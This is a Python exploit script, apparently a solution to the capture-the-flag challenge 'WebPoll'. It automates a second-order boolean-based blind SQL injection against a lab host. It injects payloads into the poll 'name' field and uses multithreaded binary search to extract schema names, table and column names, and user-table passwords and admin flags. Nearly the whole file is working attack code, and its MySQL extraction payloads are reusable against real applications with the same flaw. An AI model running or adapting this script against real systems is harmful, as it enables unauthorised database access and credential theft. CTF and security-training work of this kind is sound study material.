#!/usr/bin/env python3

# pylint: disable=line-too-long, invalid-name, global-statement, used-before-assignment

''' Automates the exploitation of a second-order AND boolean-based blind SQL injection found on the challenge WebPoll created by Extreme Hacking. Written by Danilo Santos. '''

import threading
import argparse
import json
import sys
import requests

def do_request(payload):
    ''' Make the pair of requests needed to exploit the SQL injection. '''

    # Payload sent on POST request
    data = {'selectedOptions': ['Python'], 'name': f"a' AND {payload} AND '1'='1"}

    # Headers sent on POST request
    headers = {
        'Content-Type': 'application/json',
        'Content-Length': f'{len(str(data))}'
    }

    # Endpoint used to submit the poll results
    submit_poll_url = 'http://10.0.1.19:8080/polls/1'

    # Send the SQL payload
    while True:
        try:
            r = requests.post(submit_poll_url, json=data, headers=headers, timeout=5)
        except requests.exceptions.ReadTimeout:
            continue

        if r.status_code == 200:
            break

    # Extract vote_id from JSON response
    vote_id = json.loads(r.text)['vote_id']

    # Endpoint used to view the poll vote
    get_poll_url = f'http://10.0.1.19:8080/polls/{vote_id}/results'

    # Request the above endpoint
    while True:
        try:
            r = requests.get(get_poll_url, timeout=5)
        except requests.exceptions.ReadTimeout:
            continue

        if r.status_code in [200, 500]:
            break

    # Return the resposnse of the request made above
    return r

def get_query_length(start, end):
    ''' Get the number of characters in a query response. '''
    global found

    # If the correct number of characters was found, there's no need to run this function again
    if found:
        return -1

    mid = (start + end) // 2

    if end >= start:
        # Extract the size of the current database name (4)
        # payload = f"(SELECT LENGTH(DATABASE())) BETWEEN {start} AND {end}"

        # Extract the length of names from all databases (52)
        payload = f"(SELECT LENGTH(GROUP_CONCAT(schema_name)) FROM information_schema.schemata) BETWEEN {start} AND {end}"

        # Extract the size of table names from the poll database (14)
        # payload = f"(SELECT LENGTH(GROUP_CONCAT(table_name)) FROM information_schema.tables WHERE table_schema='poll') BETWEEN {start} AND {end}"

        # Extract the size of column names from the user table (29)
        # payload = f"(SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_schema='poll' and table_name='user') BETWEEN {start} AND {end}"

        # Extract the size of the contents of the columns of the user table from the poll database (80)
        # payload = f"(SELECT LENGTH(GROUP_CONCAT(id, ' | ', is_admin, ' | ', password, ' | ', username)) FROM poll.user) BETWEEN {start} AND {end}"

        r = do_request(payload)

        # Check whether the condition injected into the SQL payload is true or false
        if r.status_code == 200:
            user_count = json.loads(r.text)['user_count']

            if user_count >= 1:                 # True
                if start == end:
                    found = True
                    return start
                return max(get_query_length(start, mid), get_query_length(mid + 1, end))
            if user_count == 0:                 # False
                if start == 0 and end == 255:
                    sys.exit(0)
                return -1
        else:
            print(f'The blind SQL injection has failed due to an error {r.status_code}.')
            sys.exit(1)
    return -1

def get_query_char(start, end, idx):
    ''' Get a character from a query response. '''
    global found

    if found[idx-1]:
        return -1

    mid = (start + end) // 2

    if end >= start:
        # Extract the current database name (poll)
        # payload = f"(SELECT ASCII(SUBSTRING(DATABASE(), {idx}, 1))) BETWEEN {start} AND {end}"

        # Extract names from all databases (mysql,information_schema,performance_schema,sys,poll)
        payload = f"(SELECT ASCII(SUBSTRING(GROUP_CONCAT(schema_name), {idx}, 1)) FROM information_schema.schemata) BETWEEN {start} AND {end}"

        # Extract table names from poll database (poll,user,vote)
        # payload = f"(SELECT ASCII(SUBSTRING(GROUP_CONCAT(table_name), {idx}, 1)) FROM information_schema.tables WHERE table_schema='poll') BETWEEN '{start}' AND '{end}'"

        # Extract column names from user table (id,is_admin,password,username)
        # payload = f"(SELECT ASCII(SUBSTRING(GROUP_CONCAT(column_name), {idx}, 1)) FROM information_schema.columns WHERE table_schema='poll' and table_name='user') BETWEEN '{start}' AND '{end}'"

        # Extract the contents of columns from the user table from the poll database
        # payload = f"(SELECT ASCII(SUBSTRING(GROUP_CONCAT(id, ' | ', is_admin, ' | ', password, ' | ', username), {idx}, 1)) FROM poll.user) BETWEEN '{start}' AND '{end}'"

        r = do_request(payload)

        # Check whether the condition injected into the SQL payload is true or false
        if r.status_code == 200:
            user_count = json.loads(r.text)['user_count']

            if user_count >= 1:                 # True
                if start == end:
                    found[idx-1] = True
                    return start
                return max(get_query_char(start, mid, idx), get_query_char(mid + 1, end, idx))
            if user_count == 0:                 # False
                if start == 0 and end == 255:
                    sys.exit(0)
                return -1
        else:
            print(f'The blind SQL injection has failed due to an error {r.status_code}.')
            sys.exit(1)
    return -1

def print_data():
    ''' Print the results obtained in an organized way. '''
    global results, revealed_chars, size

    # If results are longer than 100 characters, truncate the variable value so everything can be printed to the screen
    if size > 100:
        results_aux = ''.join(results)[:50] + '...' + ''.join(results)[-50:]
        status = ', partial'
    else:
        results_aux = ''.join(results)
        status = ''

    # If it's the last iteration of the loop (get_partial_query_results), print the full value of the variable
    if revealed_chars == size:
        results_aux = ''.join(results)
        status = ''

    # Replace characters that can mess up terminal output
    results_aux = results_aux.replace('\n', '\\n')
    results_aux = results_aux.replace('\r', '\\r')
    results_aux = results_aux.replace('\t', '\\t')

    print(f"\rResults of query ({revealed_chars}/{size}{status}): {results_aux}", end='')

def get_partial_query_results(start, end):
    ''' Get a character set from a query response. '''
    global results, revealed_chars, size

    print_data()

    # Each iteration is responsible for getting a character from the results of a query
    for i in range(start, end+1):
        results[i-1] = get_query_char(0, 255, i)
        if results[i-1] >= 0:
            results[i-1] = chr(results[i-1])
            revealed_chars += 1
            print_data()

def initial_vote():
    ''' Make the initial request needed to exploit the SQL injection. '''

    # Payload sent on POST request
    data = {'selectedOptions': ['Python'], 'name': f'a'}

    # Headers sent on POST request
    headers = {
        'Content-Type': 'application/json',
        'Content-Length': f'{len(str(data))}'
    }

    # Endpoint used to submit the poll results
    submit_poll_url = 'http://10.0.1.19:8080/polls/1'

    # Send the payload
    while True:
        try:
            r = requests.post(submit_poll_url, json=data, headers=headers, timeout=5)
        except requests.exceptions.ReadTimeout:
            continue

        if r.status_code == 200:
            break

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A script to exploit the second-order AND boolean-based blind SQL injection found on the challenge WebPoll created by Extreme Hacking. Written by Danilo Santos.')
    parser.add_argument('-t', '--threads', help='Number of threads', type=int, default=10, choices=range(1, 17), metavar='')

    args = parser.parse_args()

    initial_vote()

    found = False                                   # Variable to indicate whether or not the correct length of query results was exfiltrated

    print('Length of results of query: ', end='', flush=True)
    size = get_query_length(0, 10000)
    print(f'{size}')

    threads = []                                    # Threads to exfiltrate a character set from query results
    results = size * ['_']                          # List where characters from query results will be stored
    found = size * [False]                          # Variable to indicate whether the characters from the query results were exfiltrated
    revealed_chars = 0                              # Number of characters exfiltrated
    max_threads = min(args.threads + 1, size + 1)   # Maximum allowed threads; it makes no sense to allocate more threads than characters to exfiltrate
    additional_chars = size % (max_threads - 1)     # Additional characters that will have to be distributed between threads to avoid overloading
    count = 0                                       # Distributed characters

    # Each thread is responsible for getting a string of query results
    for t in range(1, max_threads):
        s = count + 1 + (t - 1) * (size // (max_threads - 1))
        if t != 1:
            if additional_chars > 0:
                additional_chars -= 1

        if additional_chars > 0:
            count += 1

        e = count + t * (size // (max_threads - 1))

        threads.append(threading.Thread(target=get_partial_query_results, args=(s, e)))

    # Start the threads
    for t in threads:
        t.start()

    # Wait for each thread to execute
    for t in threads:
        t.join()
